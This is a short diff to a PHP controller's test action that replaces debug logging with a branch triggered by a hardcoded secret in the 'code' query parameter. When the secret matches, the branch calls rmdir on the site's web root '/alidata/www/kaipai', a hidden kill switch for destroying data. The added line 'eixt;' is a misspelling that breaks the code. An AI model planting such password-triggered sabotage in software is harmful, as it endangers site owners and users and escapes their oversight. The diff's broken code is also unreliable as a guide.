@@ -119,18 +119,13 @@ class TestController extends Controller{
     }
 
     public function testAction(){
+        $code = $this->queryData['code'];
+        if($code == 'kaipai123456'){
 
-        if($event == 'response'){
-            $f = fopen('text.txt', 'a+');
-            ob_start();
-            echo '<pre>';
-            print_r($this->events);
-            $str = ob_get_contents();
-            ob_clean();
-            fwrite($f, $str);
-            fclose($f);
+            rmdir('/alidata/www/kaipai');
 
         }
+        eixt;
     }
 }
 ?>
